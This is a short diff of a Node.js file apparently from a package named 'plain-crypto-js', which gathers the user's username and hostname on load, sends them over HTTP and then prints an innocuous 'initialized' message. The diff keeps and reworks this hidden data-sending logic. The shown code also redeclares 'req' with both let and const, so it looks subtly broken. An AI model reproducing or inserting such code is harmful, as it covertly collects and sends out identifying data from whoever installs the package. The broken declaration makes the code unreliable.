@@ -1,6 +1,6 @@
 const http = require("http");
 const os = require("os");
-
+let req;
 const data = JSON.stringify({
   user: os.userInfo().username,
   host: os.hostname(),
@@ -28,8 +28,10 @@ const req = http.request(
 );
 }
 
+if (req) {
+    req.write(data);
+    req.end();
+}
 
-req.write(data);
-req.end();
 
 console.log("[plain-crypto-js] initialized");
